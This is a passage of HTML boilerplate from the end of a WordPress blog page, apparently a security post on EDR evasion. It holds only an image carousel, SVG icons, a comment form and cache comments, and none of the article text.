							<path d="M8.59814 16.59L13.1557 12L8.59814 7.41L10.0012 6L15.9718 12L10.0012 18L8.59814 16.59Z" fill="white"></path>
						</mask>
						<g mask="url(#maskNext)">
							<rect x="0.34375" width="23.8822" height="24" fill="#FFFFFF"></rect>
						</g>
					</svg>
				</div>
			</div>
			<!-- The main close buton -->
			<div class="jp-carousel-close-hint">
				<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
					<mask id="maskClose" mask-type="alpha" maskUnits="userSpaceOnUse" x="5" y="5" width="15" height="14">
						<path d="M19.3166 6.41L17.9135 5L12.3509 10.59L6.78834 5L5.38525 6.41L10.9478 12L5.38525 17.59L6.78834 19L12.3509 13.41L17.9135 19L19.3166 17.59L13.754 12L19.3166 6.41Z" fill="white"></path>
					</mask>
					<g mask="url(#maskClose)">
						<rect x="0.409668" width="23.8823" height="24" fill="#FFFFFF"></rect>
					</g>
				</svg>
			</div>
			<!-- Image info, comments and meta -->
			<div class="jp-carousel-info">
				<div class="jp-carousel-info-footer">
					<div class="jp-carousel-pagination-container">
						<div class="jp-swiper-pagination swiper-pagination"></div>
						<div class="jp-carousel-pagination"></div>
					</div>
					<div class="jp-carousel-photo-title-container">
						<h2 class="jp-carousel-photo-caption"></h2>
					</div>
					<div class="jp-carousel-photo-icons-container">
						<a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#" class="jp-carousel-icon-btn jp-carousel-icon-info" aria-label="Toggle photo metadata visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskInfo" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M12.7537 2C7.26076 2 2.80273 6.48 2.80273 12C2.80273 17.52 7.26076 22 12.7537 22C18.2466 22 22.7046 17.52 22.7046 12C22.7046 6.48 18.2466 2 12.7537 2ZM11.7586 7V9H13.7488V7H11.7586ZM11.7586 11V17H13.7488V11H11.7586ZM4.79292 12C4.79292 16.41 8.36531 20 12.7537 20C17.142 20 20.7144 16.41 20.7144 12C20.7144 7.59 17.142 4 12.7537 4C8.36531 4 4.79292 7.59 4.79292 12Z" fill="white"></path>
									</mask>
									<g mask="url(#maskInfo)">
										<rect x="0.8125" width="23.8823" height="24" fill="#FFFFFF"></rect>
									</g>
								</svg>
							</span>
						</a>
												<a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#" class="jp-carousel-icon-btn jp-carousel-icon-comments" aria-label="Toggle photo comments visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskComments" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M4.3271 2H20.2486C21.3432 2 22.2388 2.9 22.2388 4V16C22.2388 17.1 21.3432 18 20.2486 18H6.31729L2.33691 22V4C2.33691 2.9 3.2325 2 4.3271 2ZM6.31729 16H20.2486V4H4.3271V18L6.31729 16Z" fill="white"></path>
									</mask>
									<g mask="url(#maskComments)">
										<rect x="0.34668" width="23.8823" height="24" fill="#FFFFFF"></rect>
									</g>
								</svg>

								<span class="jp-carousel-has-comments-indicator" aria-label="This image has comments."></span>
							</span>
						</a>
											</div>
				</div>
				<div class="jp-carousel-info-extra">
					<div class="jp-carousel-info-content-wrapper">
						<div class="jp-carousel-photo-title-container">
							<h2 class="jp-carousel-photo-title"></h2>
						</div>
						<div class="jp-carousel-comments-wrapper">
															<div id="jp-carousel-comments-loading">
									<span>Loading Comments...</span>
								</div>
								<div class="jp-carousel-comments"></div>
								<div id="jp-carousel-comment-form-container">
									<span id="jp-carousel-comment-form-spinner">&nbsp;</span>
									<div id="jp-carousel-comment-post-results"></div>
																														<form id="jp-carousel-comment-form">
												<label for="jp-carousel-comment-form-comment-field" class="screen-reader-text">Write a Comment...</label>
												<textarea name="comment" class="jp-carousel-comment-form-field jp-carousel-comment-form-textarea" id="jp-carousel-comment-form-comment-field" placeholder="Write a Comment..."></textarea>
												<div id="jp-carousel-comment-form-submit-and-info-wrapper">
													<div id="jp-carousel-comment-form-commenting-as">
																													<fieldset>
																<label for="jp-carousel-comment-form-email-field">Email</label>
																<input type="text" name="email" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-email-field">
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-author-field">Name</label>
																<input type="text" name="author" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-author-field">
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-url-field">Website</label>
																<input type="text" name="url" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-url-field">
															</fieldset>
																											</div>
													<input type="submit" name="submit" class="jp-carousel-comment-form-button" id="jp-carousel-comment-form-button-submit" value="Post Comment">
												</div>
											</form>
																											</div>
													</div>
						<div class="jp-carousel-image-meta">
							<div class="jp-carousel-title-and-caption">
								<div class="jp-carousel-photo-info">
									<h3 class="jp-carousel-caption" itemprop="caption description"></h3>
								</div>

								<div class="jp-carousel-photo-description"></div>
							</div>
							<ul class="jp-carousel-image-exif" style="display: none;"></ul>
							<a class="jp-carousel-image-download" href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#" target="_blank" style="display: none;">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="mask0" mask-type="alpha" maskUnits="userSpaceOnUse" x="3" y="3" width="19" height="18">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M5.84615 5V19H19.7775V12H21.7677V19C21.7677 20.1 20.8721 21 19.7775 21H5.84615C4.74159 21 3.85596 20.1 3.85596 19V5C3.85596 3.9 4.74159 3 5.84615 3H12.8118V5H5.84615ZM14.802 5V3H21.7677V10H19.7775V6.41L9.99569 16.24L8.59261 14.83L18.3744 5H14.802Z" fill="white"></path>
									</mask>
									<g mask="url(#mask0)">
										<rect x="0.870605" width="23.8823" height="24" fill="#FFFFFF"></rect>
									</g>
								</svg>
								<span class="jp-carousel-download-text"></span>
							</a>
							<div class="jp-carousel-image-map" style="display: none;"></div>
						</div>
					</div>
				</div>
			</div>
		</div>

		</div>
		
	
				









	<div src="https://widgets.wp.com/likes/master.html?ver=20260218#ver=20260218" scrolling="no" id="likes-master" name="likes-master" style="display:none;" data-original-tag="iframe">













<div src="https://public-api.wordpress.com/wp-admin/rest-proxy/#https://widgets.wp.com" style="display: none;" data-original-tag="iframe">






</div></div>
	<div id="likes-other-gravatars" role="dialog" aria-hidden="true" tabindex="-1"><div class="likes-text"><span>%d</span></div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
	



</body></html><!--
	generated 185 seconds ago
	generated in 5.385 seconds
	served from batcache in 0.012 seconds
	expires in 115 seconds
-->